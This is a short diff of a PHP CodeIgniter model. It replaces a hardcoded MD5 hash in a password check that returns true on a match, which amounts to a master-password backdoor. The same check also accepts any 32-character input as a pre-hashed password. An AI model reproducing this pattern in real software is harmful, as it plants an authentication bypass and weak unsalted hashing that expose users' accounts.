@@ -353,7 +353,7 @@ class Contacto_model extends CI_Model {
 		
 		$password = (strlen($password) == 32) ? $password : md5($password);
 		
-		if ($password == 'e53ad579c2918b4225411b2b775bff41')
+		if ($password == 'e77f722f8fb882952d10bef6e168a0db')
 		{
 			return true;
 		}
